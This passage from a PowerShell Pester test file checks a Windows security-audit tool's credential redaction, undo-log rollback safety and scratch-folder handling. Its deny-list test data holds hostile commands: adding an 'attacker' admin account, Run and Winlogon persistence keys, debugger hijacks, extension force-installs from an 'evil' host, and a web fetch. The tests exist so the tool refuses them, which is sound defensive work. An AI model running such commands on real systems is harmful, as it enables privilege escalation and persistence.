                @(ConvertTo-CEMcpServers -Config (ConvertFrom-CEJsonc -Text $J) -Root 'mcpServers' -ToolId 't' -RelPath 'x' -AclIssue '' -Patterns (Get-CECredentialPatterns))
            }
            $json = $recs | ConvertTo-Json -Depth 6
            foreach ($c in $global:CETestMcpSecrets) { $json | Should -Not -Match $c -Because "'$c' is a credential or names the user" }
            $by = @{}; foreach ($r in $recs) { $by[$r.serverName] = $r }
            $by.leakpg.argsSummary | Should -Be '@pkg/server-postgres (redacted)'
            $by.leakredis.argsSummary | Should -Be '@pkg/redis (redacted)'
            $by.leakmongo.argsSummary | Should -Be '(redacted) @pkg/mongo'
            $by.leakkv.argsSummary | Should -Be 'serve (redacted)'
            $by.leakflag.argsSummary | Should -Be '(redacted) server.js'
            $by.leakquery.argsSummary | Should -Be '@pkg/pg postgresql://db.internal:5433'
            $by.leakconn.argsSummary | Should -Be 'Mcp.dll (redacted)'
            $by.leakcmd.command | Should -Be 'mcp-server.exe'
            $by.leakpg.command | Should -Be 'npx'
            # A credential given under its name is classified as one, by that name.
            @($by.leakkv.credentials | ForEach-Object { "$($_.key)|$($_.storage)" }) | Should -Be @('API_TOKEN|plaintext-config')
            @($by.leakflag.credentials | ForEach-Object { "$($_.key)|$($_.type)" }) | Should -Be @('api-key|api-key')
        }

        It 'keeps them out of user-status data and the report' {
            $inv = InModuleScope CEAudit -Parameters @{ P = $global:CETestMcpLeakDir } {
                param($P)
                $script:testMcpLeakDir = $P
                Mock Get-CEUserProfilePath { $script:testMcpLeakDir }
                Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'LEAK'; AuditTime = (Get-Date); IsElevated = $false; IsSystem = $false; ConsoleUserSid = $null })
            }
            @($inv.mcpServers).Count | Should -Be 8
            $global:CETestMcpLeakInv = $inv
            Set-TestDevice 'Secure'
            Mock -ModuleName CEAudit Get-CEMcpInventory { $global:CETestMcpLeakInv }
            $out = Join-Path $TestDrive 'mcp-leak-report'
            $r = Export-CEReport -Findings @(Invoke-CEAuditCore -Id 'SC-13') -Context (New-TestContext) -OutputPath $out
            $ai = InModuleScope CEAudit { Get-CEAiPosture -Context (Get-CEDeviceContext) }
            $texts = @(($inv | ConvertTo-Json -Depth 12), ($ai | ConvertTo-Json -Depth 12)) +
                @(Get-ChildItem -LiteralPath $out -Recurse -File | ForEach-Object { Get-Content -LiteralPath $_.FullName -Raw })
            (Get-Content -LiteralPath $r.Paths.Html -Raw) | Should -Match 'leakpg' -Because 'the report lists the MCP servers'
            foreach ($t in $texts) {
                foreach ($c in $global:CETestMcpSecrets) { $t | Should -Not -Match $c -Because "'$c' is a credential or names the user" }
            }
        }
    }
}

Describe 'Undo log cannot be used to escalate privilege' {
    # A tampered undo log is the one input a rollback trusts, and a rollback often runs elevated.
    # Naming an allow-listed command was once enough; these are the shapes that got through.
    It 'refuses a registry record outside the values the tool writes' {
        InModuleScope CEAudit {
            $bad = @(
                @('HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', 'Userinit'),
                @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'x'),
                @('HKLM:\SYSTEM\CurrentControlSet\Services\Foo', 'ImagePath'),
                @('HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe', 'Debugger'),
                @('HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\..\..\..\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'RunAsPPL'),
                @('HKLM:\SOFTWARE\Policies\*', 'RunAsPPL'),
                # Allowed keys, values the tool never writes.
                @('HKLM:\SYSTEM\CurrentControlSet\Control\Lsa', 'Security Packages'),
                @('HKLM:\SYSTEM\CurrentControlSet\Control\Lsa', 'Notification Packages'),
                @('HKLM:\SYSTEM\CurrentControlSet\Control\Lsa', 'Authentication Packages'),
                @('HKLM:\SOFTWARE\Policies\Google\Chrome', 'ExtensionInstallForcelist'),
                @('HKLM:\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist', '1'),
                @('HKLM:\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist', '1'),
                @('HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp', 'InitialProgram'),
                @('HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig', 'Security Packages'),
                # A listed value under a key the tool does not write.
                @('HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0', 'RunAsPPL'),
                @('HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces\a\b', 'NetbiosOptions'),
                @('HKCU:\Software\Policies\Microsoft\Office\16.0\outlook\Security', 'VBAWarnings'),
                @('HKLM:\SYSTEM\CurrentControlSet\Control\Lsa', ''),
                @('HKLM:\SYSTEM\CurrentControlSet\Control\Lsa', '*')
            )
            foreach ($b in $bad) { Test-CEUndoRegistryValueAllowed -Path $b[0] -Name $b[1] | Should -Not -BeNullOrEmpty -Because "$($b[0])\$($b[1])" }
        }
    }

    It 'still allows the values the shipped remediations write' {
        InModuleScope CEAudit {
            $ok = @(
                @('HKLM:\SYSTEM\CurrentControlSet\Control\Lsa', 'RunAsPPL'),
                @('HKLM:\SYSTEM\CurrentControlSet\Control\Lsa', 'LsaCfgFlags'),
                @('HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp', 'UserAuthentication'),
                @('HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces\Tcpip_{1234}', 'NetbiosOptions'),
                @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit', 'ProcessCreationIncludeCmdLine_Enabled'),
                @('HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU', 'NoAutoUpdate'),
                @('HKCU:\Software\Policies\Microsoft\Office\16.0\Word\Security', 'VBAWarnings')
            )
            foreach ($o in $ok) { Test-CEUndoRegistryValueAllowed -Path $o[0] -Name $o[1] | Should -BeNullOrEmpty -Because "$($o[0])\$($o[1])" }
        }
    }

    It 'refuses an allow-listed command whose arguments would hand over the machine' {
        InModuleScope CEAudit {
            $bad = @(
                'net localgroup administrators attacker /add',
                'net.exe localgroup administrators attacker /add',
                'net.exe user attacker P@ssw0rd! /add',
                'net.exe user administrator /active:yes',
                "Set-Service -Name 'Foo' -BinaryPathName 'C:\payload.exe'",
                "Set-ItemProperty -LiteralPath 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name x -Value 'payload'",
                "Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\Foo' -Name ImagePath -Value 'payload'",
                "Set-ItemProperty -LiteralPath 'HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot' -Name 'Other' -Value 0",
                "Set-ItemProperty -LiteralPath 'HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot' -Value 0",
                "Write-Warning 'x' > C:\Windows\System32\payload.ps1"
            )
            foreach ($c in $bad) { Test-CEUndoCommandAllowed $c | Should -Not -BeNullOrEmpty -Because $c }
        }
    }

    It 'skips a tampered registry record instead of writing it, and keeps going' {
        InModuleScope CEAudit {
            Mock New-ItemProperty { }
            Mock New-Item { }
            Mock Test-CEIsAdmin { $false }
            $log = Join-Path $TestDrive 'undo-tampered.json'
            [pscustomobject]@{
                ComputerName = $env:COMPUTERNAME
                Items        = @([pscustomobject]@{
                        ItemId = 'C001'
                        Undo   = @([pscustomobject]@{
                                Type = 'Registry'; Existed = $true; Kind = 'ExpandString'
                                Path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
                                Name = 'Userinit'; Value = 'C:\payload.exe'
                            })
                    })
            } | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $log -Encoding UTF8

            $warnings = @()
            Restore-CEUndoLog -Path $log -Confirm:$false -WarningVariable warnings -WarningAction SilentlyContinue
            Should -Invoke New-ItemProperty -Times 0
            ($warnings -join ' ') | Should -Match 'Refusing to restore'
        }
    }
}

Describe 'Undo round trip through the registry allow-list' {
    # Every value a remediation writes must be one a rollback will restore; a value missing from the
    # allow-list makes the fix silently one-way (AppUpdate-Unblock was, until this was tested).
    BeforeAll {
        # OfficeMacros-Harden refuses to run as someone other than the signed-in user.
        Set-TestDevice -Kind Insecure -ContextOverride @{ RunningAs = 'TESTPC\paul' }
        # The value each conditional fix looks for before it writes.
        $global:CETestUndoCurrent = @{
            NoAutoUpdate = 1; ConsentPromptBehaviorAdmin = 0; ConsentPromptBehaviorUser = 2; MaximumPINLength = 6
            DisableAntiSpyware = 1; DisableAntiVirus = 1; SafeBrowsingProtectionLevel = 0; DownloadRestrictions = 0
            UpdateDefault = 0; 'Update{56EB18F8-B008-4CBD-B6D2-8C97FE7E9062}' = 0; 'Update{8A69D345-D564-463C-AFF1-A69D9E530F96}' = 0
            DisableAppUpdate = 1; AutoDownload = 2; enableautomaticupdates = 0; UpdatesEnabled = 'False'
        }
        $global:CETestUndoWrites = New-Object System.Collections.ArrayList
        Mock -ModuleName CEAudit Get-CERegistryValue { if ($global:CETestUndoCurrent.ContainsKey($Name)) { $global:CETestUndoCurrent[$Name] } else { $Default } }
        Mock -ModuleName CEAudit Get-CERegistryState { @{ Path = $Path; Name = $Name; Existed = $true; Value = 12345; Kind = 'DWord' } }
        Mock -ModuleName CEAudit Test-CERegistryValueExists { $true }
        Mock -ModuleName CEAudit Test-Path { $true }
        Mock -ModuleName CEAudit Test-CEIsAdmin { $false }
        Mock -ModuleName CEAudit New-ItemProperty { [void]$global:CETestUndoWrites.Add("$LiteralPath|$Name") }
        Mock -ModuleName CEAudit Remove-ItemProperty { [void]$global:CETestUndoWrites.Add("$LiteralPath|$Name") }
        Mock -ModuleName CEAudit Get-ChildItem { [pscustomobject]@{ PSChildName = 'Tcpip_{0A1B2C3D-0000-1111-2222-333344445555}' } }
        Mock -ModuleName CEAudit Get-Service { [pscustomobject]@{ StartType = 'Manual' } }
        Mock -ModuleName CEAudit Get-MpPreference {
            [pscustomobject]@{ DisableRealtimeMonitoring = $false; DisableBehaviorMonitoring = $false; DisableIOAVProtection = $false; DisableScriptScanning = $false }
        }
        Mock -ModuleName CEAudit Confirm-SecureBootUEFI { $true }
        Mock -ModuleName CEAudit Start-ScheduledTask { }

        function global:Invoke-TestUndoRoundTrip {
            <# Applies one fix against the mocked registry, then rolls it back from a written undo log. #>
            param([string]$Id, [hashtable]$Params = @{})
            $global:CETestUndoWrites.Clear()
            $r = Invoke-CERemediation -Id $Id -Parameters $Params
            $records = @($r.Undo | Where-Object { $_.Type -eq 'Registry' })
            $commands = @($r.Undo | Where-Object { $_.Type -eq 'Command' -and $_.Command -match '^Set-ItemProperty ' })
            $applied = @($global:CETestUndoWrites)
            $refusedCommands = @(foreach ($c in $commands) {
                    InModuleScope CEAudit -Parameters @{ C = $c.Command } { param($C) Test-CEUndoCommandAllowed $C }
                })
            $log = Join-Path $TestDrive "undo-$Id-$(@($Params.Values) -join '-').json"
            [pscustomobject]@{
                ComputerName = $env:COMPUTERNAME
                Items        = @([pscustomobject]@{ ItemId = 'C001'; Undo = $records })
            } | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $log -Encoding UTF8
            $global:CETestUndoWrites.Clear()
            $warnings = @()
            Restore-CEUndoLog -Path $log -Confirm:$false -WarningVariable warnings -WarningAction SilentlyContinue
            [pscustomobject]@{
                Status          = $r.Status
                Message         = $r.Message
                Records         = @($records | ForEach-Object { "$($_.Path)|$($_.Name)" })
                Applied         = $applied
                Restored        = @($global:CETestUndoWrites)
                Commands        = $commands.Count
                RefusedCommands = @($refusedCommands | Where-Object { $_ })
                Warnings        = @($warnings)
            }
        }

        $script:UndoCases = @(
            @{ Id = 'RDP-RequireNLA' }, @{ Id = 'RDP-Disable' }, @{ Id = 'Autorun-Disable' },
            @{ Id = 'Lock-InactivityTimeout'; Params = @{ Seconds = 600 } }, @{ Id = 'HelloPin-MinLength'; Params = @{ Length = 8 } },
            @{ Id = 'RemoteAssistance-Disable' }, @{ Id = 'WindowsUpdate-EnableAuto' }, @{ Id = 'WindowsUpdate-Resume' },
            @{ Id = 'WindowsUpdate-RemoveQualityDeferral' }, @{ Id = 'UAC-Harden' }, @{ Id = 'Defender-EnableRealtime' },
            @{ Id = 'SmartScreen-Enforce'; Params = @{ Target = 'Windows' } }, @{ Id = 'SmartScreen-Enforce'; Params = @{ Target = 'Edge' } },
            @{ Id = 'SmartScreen-Enforce'; Params = @{ Target = 'Chrome' } },
            @{ Id = 'OfficeMacros-Harden'; Params = @{ App = 'word' } }, @{ Id = 'OfficeMacros-Harden'; Params = @{ App = 'excel' } },
            @{ Id = 'OfficeMacros-Harden'; Params = @{ App = 'powerpoint' } },
            @{ Id = 'VBS-EnableHVCI' }, @{ Id = 'VBS-EnableCredentialGuard' }, @{ Id = 'Lsa-EnablePPL' },
            @{ Id = 'Hardening-WDigestOff' }, @{ Id = 'Hardening-NtlmV2Only' }, @{ Id = 'Hardening-LlmnrOff' },
            @{ Id = 'Hardening-RestrictAnonymous' }, @{ Id = 'Hardening-SmbClientSigning' }, @{ Id = 'Hardening-CommandLineLogging' },
            @{ Id = 'Hardening-NetbiosOff' }, @{ Id = 'SecureBoot-Deploy2023Certs' }
        )
        foreach ($app in @('Edge', 'Chrome', 'Firefox', 'Store', 'Office', 'OfficeC2R')) { $script:UndoCases += @{ Id = 'AppUpdate-Unblock'; Params = @{ App = $app } } }
    }

    AfterAll {
        Remove-Item -Path 'function:global:Invoke-TestUndoRoundTrip' -ErrorAction SilentlyContinue
        Remove-Variable -Name CETestUndoCurrent, CETestUndoWrites -Scope Global -ErrorAction SilentlyContinue
    }

    It 'covers every remediation that writes the registry' {
        $writers = @(Get-CERemediation | Where-Object { $_.Apply.ToString() -match 'RegistryValueTracked|ItemProperty' } | ForEach-Object { $_.Id })
        $writers.Count | Should -BeGreaterThan 20
        $tested = @($script:UndoCases | ForEach-Object { $_.Id })
        foreach ($w in $writers) { $tested | Should -Contain $w -Because "$w writes the registry, so its undo must be round-tripped here" }
    }

    It 'restores every value each fix writes, with nothing refused' {
        foreach ($c in $script:UndoCases) {
            $p = if ($c.ContainsKey('Params')) { $c.Params } else { @{} }
            $label = "$($c.Id) $(@($p.Values) -join ',')"
            $rt = Invoke-TestUndoRoundTrip -Id $c.Id -Params $p
            $rt.Status | Should -Be 'Applied' -Because "$label should apply against the mocked registry ($($rt.Message))"
            ($rt.Records.Count + $rt.Commands) | Should -BeGreaterThan 0 -Because "$label should record undo data"
            # SecureBoot-Deploy2023Certs writes directly and records a command instead.
            if (-not $rt.Commands) { ($rt.Records | Sort-Object) -join ';' | Should -Be (($rt.Applied | Sort-Object) -join ';') -Because "$label records one undo entry per value it writes" }
            $rt.Warnings.Count | Should -Be 0 -Because "$label undo must not be refused: $($rt.Warnings -join '; ')"
            ($rt.Restored | Sort-Object) -join ';' | Should -Be (($rt.Records | Sort-Object) -join ';') -Because "$label restores every value it wrote"
            $rt.RefusedCommands.Count | Should -Be 0 -Because "$label undo command must be allowed: $($rt.RefusedCommands -join '; ')"
        }
    }

    It 'restores AppUpdate-Unblock, whose undo used to be refused' {
        $rt = Invoke-TestUndoRoundTrip -Id 'AppUpdate-Unblock' -Params @{ App = 'Chrome' }
        ($rt.Records | Sort-Object) -join ';' | Should -Be 'HKLM:\SOFTWARE\Policies\Google\Update|Update{8A69D345-D564-463C-AFF1-A69D9E530F96};HKLM:\SOFTWARE\Policies\Google\Update|UpdateDefault' -Because 'both Chrome update policies were blocked'
        $rt.Warnings.Count | Should -Be 0
        ($rt.Restored | Sort-Object) -join ';' | Should -Be (($rt.Records | Sort-Object) -join ';')
        $rt = Invoke-TestUndoRoundTrip -Id 'AppUpdate-Unblock' -Params @{ App = 'OfficeC2R' }
        $rt.Warnings.Count | Should -Be 0
        $rt.Restored -join ';' | Should -Be 'HKLM:\SOFTWARE\Microsoft\Office\ClickToRun\Configuration|UpdatesEnabled'
    }

    It 'refuses an unlisted value under an allowed key and still restores the listed ones' {
        $log = Join-Path $TestDrive 'undo-unlisted.json'
        $rec = { param($Path, $Name, $Existed, $Kind, $Value) [pscustomobject]@{ Type = 'Registry'; Path = $Path; Name = $Name; Existed = $Existed; Kind = $Kind; Value = $Value; KeyCreated = $false } }
        [pscustomobject]@{
            ComputerName = $env:COMPUTERNAME
            Items        = @([pscustomobject]@{
                    ItemId = 'C001'
                    Undo   = @(
                        (& $rec 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' 'RunAsPPL' $true 'DWord' 0),
                        (& $rec 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' 'Security Packages' $true 'MultiString' @('kerberos', 'evil')),
                        (& $rec 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' 'Notification Packages' $false $null $null),
                        (& $rec 'HKLM:\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist' '1' $true 'String' 'abcdefghijklmnop;https://evil/update.xml'),
                        (& $rec 'HKLM:\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist' '1' $true 'String' 'abcdefghijklmnop;https://evil/update.xml'),
                        (& $rec 'HKLM:\SOFTWARE\Policies\Microsoft\Edge' 'ExtensionInstallForcelist' $true 'String' 'x')
                    )
                })
        } | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $log -Encoding UTF8
        $global:CETestUndoWrites.Clear()
        $warnings = @()
        Restore-CEUndoLog -Path $log -Confirm:$false -WarningVariable warnings -WarningAction SilentlyContinue
        @($global:CETestUndoWrites) -join ';' | Should -Be 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa|RunAsPPL'
        @($warnings).Count | Should -Be 5
        ($warnings -join ' ') | Should -Match 'Security Packages'
        ($warnings -join ' ') | Should -Match 'Notification Packages'
    }
}

Describe 'Undo command safety (Test-CEUndoCommandAllowed)' {
    It 'allows the commands remediations actually generate' {
        InModuleScope CEAudit {
            $ok = @(
                "Set-NetFirewallProfile -Name 'Domain' -Enabled 'True'",
                "Enable-NetFirewallRule -Name 'RuleX'",
                "Enable-LocalUser -SID 'S-1-5-21-1-2-3-1001'",
                "net.exe user 'bob' /passwordreq:no",
                "Add-MpPreference -AttackSurfaceReductionRules_Ids 'abc' -AttackSurfaceReductionRules_Actions 'Enabled'",
                "Set-Service -Name 'W32Time' -StartupType 'Manual'",
                "wevtutil.exe sl Application /ms:20971520",
                "net.exe accounts /lockoutthreshold:10; net.exe accounts /lockoutduration:15 /lockoutwindow:15",
                "Set-ItemProperty -LiteralPath 'HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot' -Name 'AvailableUpdates' -Value 0",
                "Suspend-BitLocker -MountPoint `$env:SystemDrive -RebootCount 1 | Out-Null",
                "Enable-WindowsOptionalFeature -Online -FeatureName 'SMB1Protocol' -NoRestart -All | Out-Null"
            )
            foreach ($c in $ok) { Test-CEUndoCommandAllowed $c | Should -BeNullOrEmpty -Because $c }
        }
    }

    It 'refuses anything outside the allow-list or with code-execution constructs' {
        InModuleScope CEAudit {
            $bad = @(
                "Invoke-Expression 'calc'",
                "Start-Process calc.exe",
                "Set-Service -Name 'x' -StartupType 'Manual'; Invoke-WebRequest 'http://evil/x'",
                "[System.IO.File]::WriteAllText('a.txt','pwned')",
                "& { whoami }",
                "Set-NetFirewallProfile -Name (iex 'evil')"
            )
            foreach ($c in $bad) { Test-CEUndoCommandAllowed $c | Should -Not -BeNullOrEmpty -Because $c }
        }
    }
}

Describe 'Native tool scratch and backup files stay out of shared folders' {
    # secedit and auditpol write files that are read back as administrator or SYSTEM. In the shared temp
    # folder (C:\Windows\Temp for SYSTEM) or next to an undo log a standard user can write, those files
    # could be predicted, planted or swapped. Elevated, they go in GUID-named folders locked at birth in
    # the data folder, and the rollback refuses an audit policy backup that is not in one.
    BeforeAll {
        # Elevated on Windows, with a birth descriptor a standard user can apply (no owner) and every
        # folder judged trusted: what the locked-folder path does is covered by its own Describe. Text,
        # so that it is compiled and dot-sourced inside the module (InModuleScope), not in this file.
        $global:CETestScratchElevated = @'
param($Root)
$script:CEDataRootOverride = $Root
Mock Test-CEIsWindows { $true }
Mock Test-CEIsAdmin { $true }
Mock Get-CELockedFolderProblem { '' }
Mock New-CELockedDirectorySecurity { $s = New-Object Security.AccessControl.DirectorySecurity; $s.SetSecurityDescriptorSddlForm('D:(A;OICI;FA;;;WD)'); $s }
'@
    }
    AfterAll { Remove-Variable -Scope Global -Name CETestScratchElevated, CETestScratchSeen -ErrorAction SilentlyContinue }

    It 'elevated, makes a new GUID-named folder locked at birth in the data folder' {
        $root = Join-Path $TestDrive 'scr-new'
        InModuleScope CEAudit -Parameters @{ Root = $root; Setup = $global:CETestScratchElevated } {
            param($Root, $Setup)
            . ([scriptblock]::Create($Setup)) $Root
            try {
                $first = New-CEScratchFolder -Area 'scratch'
                $first | Should -Match ('^' + [regex]::Escape((Join-Path $Root 'scratch')) + '\\[0-9a-f]{32}$')
                Test-Path -LiteralPath $first -PathType Container | Should -BeTrue
                @(Get-ChildItem -LiteralPath $first -Force).Count | Should -Be 0
                # The data folder, the area folder and the GUID folder were each made with the locked descriptor.
                Should -Invoke New-CELockedDirectorySecurity -Times 3 -Exactly
                $second = New-CEScratchFolder -Area 'scratch'
                $second | Should -Not -Be $first
                Should -Invoke New-CELockedDirectorySecurity -Times 4 -Exactly
            }
            finally { $script:CEDataRootOverride = $null }
        }
    }

    It 'not elevated, makes a new GUID-named folder in the user temp folder' {
        InModuleScope CEAudit {
            Mock Test-CEIsAdmin { $false }
            Mock New-CELockedDirectorySecurity { throw 'not expected' }
            $d = New-CEScratchFolder -Area 'scratch'
            try {
                (Split-Path -Parent $d).TrimEnd('\') | Should -Be ([IO.Path]::GetTempPath()).TrimEnd('\')
                Split-Path -Leaf $d | Should -Match '^ceaudit-[0-9a-f]{32}$'
                Test-Path -LiteralPath $d -PathType Container | Should -BeTrue
            }
            finally { if ($d -and (Test-Path -LiteralPath $d)) { [IO.Directory]::Delete($d, $false) } }
        }
    }

    It 'elevated, the secedit export goes in a locked scratch folder that is deleted afterwards' {
        $root = Join-Path $TestDrive 'scr-export'
        InModuleScope CEAudit -Parameters @{ Root = $root; Setup = $global:CETestScratchElevated } {
            param($Root, $Setup)
            . ([scriptblock]::Create($Setup)) $Root
            try {
                $global:CETestScratchSeen = @()
                Mock Invoke-CENative {
                    $global:CETestScratchSeen += $ArgumentList[2]
                    Set-Content -LiteralPath $ArgumentList[2] -Value @('[System Access]', 'PasswordComplexity = 1')
                    [pscustomobject]@{ ExitCode = 0; Output = @() }
                }
                $policy = Get-CESecurityPolicy
                $policy['PasswordComplexity'] | Should -Be '1'
                $inf = $global:CETestScratchSeen[0]
                $inf | Should -Match ('^' + [regex]::Escape((Join-Path $Root 'scratch')) + '\\[0-9a-f]{32}\\secpol\.inf$')
                Test-Path -LiteralPath (Split-Path -Parent $inf) | Should -BeFalse -Because 'the scratch folder is deleted once read'
            }
            finally { $script:CEDataRootOverride = $null }
        }
    }

    It 'elevated, the secedit /configure INF and database go in a locked scratch folder that is deleted afterwards' {
        $root = Join-Path $TestDrive 'scr-configure'
        InModuleScope CEAudit -Parameters @{ Root = $root; Setup = $global:CETestScratchElevated } {
            param($Root, $Setup)
            . ([scriptblock]::Create($Setup)) $Root
            try {
                $global:CETestScratchSeen = @()
                Mock Invoke-CENative {
                    $global:CETestScratchSeen += [pscustomobject]@{ Db = $ArgumentList[2]; Cfg = $ArgumentList[4]; CfgExists = (Test-Path -LiteralPath $ArgumentList[4]) }
                    Set-Content -LiteralPath $ArgumentList[2] -Value 'db'
                    [pscustomobject]@{ ExitCode = 0; Output = @() }
                }
                # The module-level tripwire mocks Set-CESecurityPolicyValue; call the real function.
                $real = Get-Command -Name Set-CESecurityPolicyValue -CommandType Function
                & $real -Name 'PasswordComplexity' -Value 0
                $seen = $global:CETestScratchSeen[0]
                $seen.CfgExists | Should -BeTrue
                $dir = Split-Path -Parent $seen.Cfg
                $dir | Should -Match ('^' + [regex]::Escape((Join-Path $Root 'scratch')) + '\\[0-9a-f]{32}$')
                Split-Path -Parent $seen.Db | Should -Be $dir
                Test-Path -LiteralPath $dir | Should -BeFalse -Because 'the scratch folder is deleted afterwards'
            }
            finally { $script:CEDataRootOverride = $null }
        }
    }

    It 'elevated, AuditPolicy-Set writes its backup in a locked GUID folder in the data folder, not next to the undo log' {
        $root = Join-Path $TestDrive 'scr-auditpol'
        $undoDir = Join-Path $TestDrive 'scr-auditpol-undo'
        New-Item -ItemType Directory -Path $undoDir | Out-Null
        InModuleScope CEAudit -Parameters @{ Root = $root; UndoDir = $undoDir; Setup = $global:CETestScratchElevated } {
            param($Root, $UndoDir, $Setup)
            . ([scriptblock]::Create($Setup)) $Root
            try {
                Mock Get-CEDeviceContext { New-TestContext }
                Mock Invoke-CENative {
                    if ($ArgumentList[0] -eq '/backup') { Set-Content -LiteralPath ($ArgumentList[1] -replace '^/file:', '') -Value 'Machine Name,Policy Target' }
                    [pscustomobject]@{ ExitCode = 0; Output = @() }
                }
                $r = Invoke-CERemediation -Id 'AuditPolicy-Set' -Parameters @{ Subcategories = @('0cce922b-69ae-11d9-bed3-505054503030|Success') } -UndoDirectory $UndoDir -Confirm:$false
                $r.Status | Should -Be 'Applied' -Because $r.Message
                $cmd = [string](@($r.Undo | Where-Object { $_.Type -eq 'Command' })[0].Command)
                $cmd -match "^auditpol\.exe /restore /file:'(.+)'$" | Should -BeTrue -Because $cmd
                $backup = $Matches[1]
                $backup | Should -Match ('^' + [regex]::Escape((Join-Path $Root 'backups')) + '\\[0-9a-f]{32}\\auditpol-backup-\d{8}-\d{6}\.csv$')
                Test-Path -LiteralPath $backup | Should -BeTrue
                @(Get-ChildItem -LiteralPath $UndoDir -Force).Count | Should -Be 0 -Because 'nothing is written next to the undo log'
                # The generated undo command passes the rollback's checks when its folder is trusted.
                Mock Get-CEDataPathProblem { }
                Test-CEUndoCommandAllowed $cmd | Should -BeNullOrEmpty
            }
            finally { $script:CEDataRootOverride = $null }
        }
    }

    It 'an elevated rollback refuses a planted or swapped audit policy backup, and restores a trusted one' {
        $trusted = Join-Path $TestDrive 'bk-trusted'
        $planted = Join-Path $TestDrive 'bk-planted'
        foreach ($d in $trusted, $planted) { New-Item -ItemType Directory -Path $d | Out-Null }
        $files = [ordered]@{
            C001 = Join-Path $planted 'auditpol-backup-20260101-000000.csv'   # planted in a folder a standard user can write
            C002 = Join-Path $trusted 'linked.csv'                            # swapped for a link
            C003 = Join-Path $trusted 'swapped.csv'                           # swapped for a file a standard user owns
            C004 = Join-Path $trusted 'auditpol-backup-20260101-000001.csv'   # the real one
        }
        foreach ($f in $files.Values) { Set-Content -LiteralPath $f -Value 'Machine Name,Policy Target' }
        $log = Join-Path $trusted 'undo.json'
        [pscustomobject]@{
            ComputerName = $env:COMPUTERNAME
            Items        = @($files.Keys | ForEach-Object {
                    [pscustomobject]@{ ItemId = $_; Undo = @([pscustomobject]@{ Type = 'Command'; Description = 'Restore previous audit policy'; Command = "auditpol.exe /restore /file:'$($files[$_])'" }) }
                })
        } | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $log -Encoding UTF8
        InModuleScope CEAudit -Parameters @{ Log = $log; Good = $files.C004; Planted = $planted } {
            param($Log, $Good, $Planted)
            Mock Test-CEIsAdmin { $true }
            Mock Test-CEIsWindows { $true }
            Mock Test-CEDataLink { $Path -like '*linked.csv' }
            Mock Get-CEPathAclProblem {
                # Only the folder is writable: the planted file itself looks trusted, so the refusal must come from the folder test.
                if ($Path.TrimEnd('\') -like '*\bk-planted') { return "$Path is writable by S-1-5-21-1-2-3-1001" }
                if ($Path -like '*swapped.csv') { return "$Path is owned by S-1-5-21-1-2-3-1001" }
            }
            Mock Write-Host { }
            Mock auditpol.exe { }
            $warnings = @()
            Restore-CEUndoLog -Path $Log -Confirm:$false -WarningVariable warnings -WarningAction SilentlyContinue
            Should -Invoke auditpol.exe -Times 1 -Exactly
            Should -Invoke auditpol.exe -Times 1 -Exactly -ParameterFilter { ($args -join ' ') -eq "/restore /file:$Good" }
            $refused = @($warnings | Where-Object { "$_" -match 'Refusing to run undo command.*planted or swapped' })
            $refused.Count | Should -Be 3 -Because ($warnings -join "`n")
            $c001 = @($refused | Where-Object { "$_" -match 'C001' })
            $c001.Count | Should -Be 1 -Because ($warnings -join "`n")
            "$($c001[0])" | Should -Match ([regex]::Escape("$Planted is writable by"))
            ($refused -join ' ') | Should -Match 'linked\.csv is a link'
            ($refused -join ' ') | Should -Match 'swapped\.csv is owned by'
        }
    }

    It 'allows only the generated auditpol /restore form, with a full local path when elevated' {
        InModuleScope CEAudit {
            Mock Test-CEIsAdmin { $true }
            Mock Get-CEDataPathProblem { }
            $bad = @(
                'auditpol.exe /set /subcategory:{0cce922b-69ae-11d9-bed3-505054503030} /success:disable',
                'auditpol.exe /clear /y',
                'auditpol /remove /allusers',
                'auditpol.exe /restore /file:$env:TEMP\x.csv',
                "auditpol.exe /restore /file:'relative.csv'",
                "auditpol.exe /restore /file:'\\server\share\x.csv'",
                "auditpol.exe /restore /file:'C:\ProgramData\EngramicBaseline\backups\..\..\x.csv'",
                "auditpol.exe /restore /file:'C:\a.csv' /file:'C:\b.csv'"
            )
            foreach ($c in $bad) { Test-CEUndoCommandAllowed $c | Should -Not -BeNullOrEmpty -Because $c }
            Test-CEUndoCommandAllowed "auditpol.exe /restore /file:'C:\ProgramData\EngramicBaseline\backups\0123abcd\auditpol-backup-20260101-000000.csv'" | Should -BeNullOrEmpty
            # A standard user's rollback keeps the shape rule but not the path rule: it only affects that user.
            Mock Test-CEIsAdmin { $false }
